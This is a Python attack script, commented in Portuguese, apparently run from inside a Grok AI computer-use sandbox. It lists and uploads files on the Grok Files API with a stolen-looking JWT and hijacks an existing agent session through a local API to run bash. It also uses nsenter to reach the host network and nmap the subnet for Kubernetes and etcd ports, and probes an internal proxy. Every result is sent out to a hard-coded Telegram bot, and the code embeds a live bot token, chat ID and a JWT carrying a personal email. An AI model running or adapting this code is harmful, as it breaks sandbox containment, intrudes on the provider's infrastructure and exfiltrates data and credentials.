#!/usr/bin/env python3
"""
Exploração final - combina Grok Files, API Grok Computer, scan de rede e proxy interno.
"""

import subprocess
import json
import requests
import os
import time
import socket
import re
from datetime import datetime

# ------------------------------------------------------------
# CONFIGURAÇÃO
# ------------------------------------------------------------
TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"
JWT = os.getenv("TERMINAL_JWT_VAL", "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIyOGYwMDg5OC02NDQ3LTQzNDItYWU1ZS04YmM2NTdiNzYwNWIiLCJjaWQiOiJmMDFmMWVhOS0wYmUzLTQ5NWItOWI2Yy1kOTU3YWZiMzIwNTAiLCJlbWFpbCI6IndhbmRlcnNvbmx3bHdAZ21haWwuY29tIiwic2wiOiJMb2dnZWRJbiIsInB0IjoiMzJkZDVjNjktYzI5Mi00Zjk0LTlmN2QtM2ZhODYxZTg4MDBlIiwiZXhwIjoxNzg3ODA1ODM2LCJpYXQiOjE3ODc4MDIyMzZ9.XXXXX")  # substitua
GROK_SESSION_ID = "6518367e-1ae0-40c0-9cc6-21b350742329"  # do ps

# ------------------------------------------------------------
# FUNÇÕES AUXILIARES
# ------------------------------------------------------------
def run_cmd(cmd, timeout=30):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def send_telegram(text, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}, timeout=10)
    except:
        pass

def send_file(filename, caption=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(filename, 'rb') as f:
            requests.post(url, files={'document': f}, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=30)
    except:
        pass

def send_data(data_dict):
    for key, content in data_dict.items():
        if not content or content == "N/A":
            continue
        if len(content) > 4000:
            tmp = f"/tmp/{key.replace('/','_').replace(' ','_')}.txt"
            with open(tmp, "w", encoding="utf-8", errors="ignore") as f:
                f.write(content)
            send_file(tmp, caption=f"📄 {key[:50]}")
            os.remove(tmp)
        else:
            send_telegram(f"📄 **{key}**\n```\n{content[:3000]}\n```")

# ------------------------------------------------------------
# 1. GROK FILES - LISTAR ARQUIVOS E UPLOAD
# ------------------------------------------------------------
def grok_files_list():
    base = "https://files.grok.com"
    headers = {"Authorization": f"Bearer {JWT}"}
    # Tentar listar com parâmetros comuns
    params_list = [
        {},
        {"limit": 10},
        {"page": 1},
        {"sort": "created_at"},
        {"order": "desc"},
        {"path": "/"},
        {"recursive": "true"}
    ]
    results = {}
    for params in params_list:
        try:
            r = requests.get(f"{base}/v1/files", headers=headers, params=params, timeout=10)
            results[f"GET /v1/files {params}"] = f"Status: {r.status_code}\n{str(r.text[:500])}"
        except Exception as e:
            results[f"GET /v1/files {params}"] = f"Erro: {e}"
    # Tentar /v1/list com parâmetros
    for params in params_list[:3]:
        try:
            r = requests.get(f"{base}/v1/list", headers=headers, params=params, timeout=10)
            results[f"GET /v1/list {params}"] = f"Status: {r.status_code}\n{str(r.text[:500])}"
        except Exception as e:
            results[f"GET /v1/list {params}"] = f"Erro: {e}"
    return results

def grok_files_upload():
    base = "https://files.grok.com"
    headers = {"Authorization": f"Bearer {JWT}"}
    # Criar um arquivo de teste
    test_content = b"teste de upload via Grok Files"
    files = {'file': ('teste.txt', test_content, 'text/plain')}
    try:
        r = requests.post(f"{base}/v1/upload", headers=headers, files=files, timeout=10)
        return f"Status: {r.status_code}\n{r.text[:500]}"
    except Exception as e:
        return f"Erro: {e}"

# ------------------------------------------------------------
# 2. API GROK COMPUTER - USAR SESSÃO EXISTENTE
# ------------------------------------------------------------
def grok_computer_execute(command):
    base = "http://127.0.0.1:4242"
    headers = {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json"}
    # Primeiro, tentar listar sessões (GET /sessions)
    try:
        r = requests.get(f"{base}/sessions", headers=headers, timeout=5)
        sessions_info = f"GET /sessions: {r.status_code} - {r.text[:200]}"
    except Exception as e:
        sessions_info = f"GET /sessions erro: {e}"
    # Agora usar a sessão conhecida
    if GROK_SESSION_ID:
        cmd_payload = {
            "method": "tools/call",
            "params": {
                "name": "bash",
                "arguments": {
                    "command": command,
                    "timeout": "30"
                }
            }
        }
        try:
            r = requests.post(
                f"{base}/sessions/{GROK_SESSION_ID}/tools/call",
                headers=headers,
                json=cmd_payload,
                timeout=30
            )
            exec_result = f"POST /sessions/{GROK_SESSION_ID}/tools/call\nStatus: {r.status_code}\n{r.text[:1000]}"
        except Exception as e:
            exec_result = f"Erro ao executar: {e}"
        return sessions_info + "\n\n" + exec_result
    else:
        return sessions_info

# ------------------------------------------------------------
# 3. DESCOBRIR REDE E FAZER SCAN
# ------------------------------------------------------------
def get_container_ip():
    # Tenta obter IP do container
    ip = run_cmd("hostname -I 2>/dev/null | awk '{print $1}'")
    if ip and "ERRO" not in ip:
        return ip
    # Fallback via ip route
    ip = run_cmd("ip route get 1 | awk '{print $NF;exit}' 2>/dev/null")
    if ip and "ERRO" not in ip:
        return ip
    # Fallback via nsenter
    ip = run_cmd("nsenter -t 1 -n -- hostname -I 2>/dev/null | awk '{print $1}'")
    if ip and "ERRO" not in ip:
        return ip
    return None

def network_scan_with_nmap(ip):
    # Tenta usar nmap via nsenter
    if "ERRO" not in run_cmd("which nmap"):
        # Escaneia a sub-rede /24 do IP
        subnet = ip.rsplit('.', 1)[0] + ".0/24"
        cmd = f"nsenter -t 1 -n -- nmap -p 443,6443,8080,9090,4242,22,2379,10250,80,8081,8082 -T4 {subnet} -oG - | grep '/open/'"
        return run_cmd(cmd, timeout=120)
    else:
        # Usa bash + nc (mais lento)
        return "Nmap não encontrado, scan manual não implementado."

# ------------------------------------------------------------
# 4. EXPLORAR PROXY INTERNO (35.245.43.102)
# ------------------------------------------------------------
def explore_internal_proxy():
    base = "http://35.245.43.102"
    ports = [80, 8080, 8081, 8082, 443, 8083]
    results = {}
    for port in ports:
        url = f"{base}:{port}"
        try:
            r = requests.get(url, timeout=3)
            results[port] = f"Status: {r.status_code} - {r.text[:100]}"
        except:
            results[port] = "Timeout ou conexão recusada"
    return results

# ------------------------------------------------------------
# FUNÇÃO PRINCIPAL
# ------------------------------------------------------------
def main():
    send_telegram("🚀 **Iniciando exploração final**")

    # 1. Grok Files - listagem e upload
    send_telegram("🔍 Listando arquivos no Grok Files...")
    list_results = grok_files_list()
    for k, v in list_results.items():
        send_telegram(f"📄 **{k}**\n```\n{v[:500]}\n```")
    send_telegram("📤 Testando upload no Grok Files...")
    upload_res = grok_files_upload()
    send_telegram(f"📄 **Upload**\n```\n{upload_res[:500]}\n```")

    # 2. API Grok Computer com sessão existente
    send_telegram("🔄 Testando API Grok Computer (sessão existente)...")
    grok_res = grok_computer_execute("whoami")
    send_telegram(f"📄 **Grok API**\n```\n{grok_res[:1000]}\n```")

    # 3. Scan de rede
    container_ip = get_container_ip()
    if container_ip and "ERRO" not in container_ip:
        send_telegram(f"🔍 IP do container: `{container_ip}`. Escaneando rede...")
        scan_res = network_scan_with_nmap(container_ip)
        if scan_res and "ERRO" not in scan_res and len(scan_res) > 10:
            if len(scan_res) > 4000:
                tmp = "/tmp/scan.txt"
                with open(tmp, "w") as f:
                    f.write(scan_res)
                send_file(tmp, caption="📄 Resultado do scan")
                os.remove(tmp)
            else:
                send_telegram(f"📄 **Scan**\n```\n{scan_res[:3000]}\n```")
        else:
            send_telegram("❌ Nenhum host encontrado no scan.")
    else:
        send_telegram("❌ Não foi possível obter IP do container.")

    # 4. Explorar proxy interno
    send_telegram("🔍 Explorando proxy interno (35.245.43.102)...")
    proxy_res = explore_internal_proxy()
    for port, info in proxy_res.items():
        send_telegram(f"📄 **Porta {port}**\n```\n{info}\n```")

    send_telegram("✅ **Exploração finalizada**")

if __name__ == "__main__":
    main()
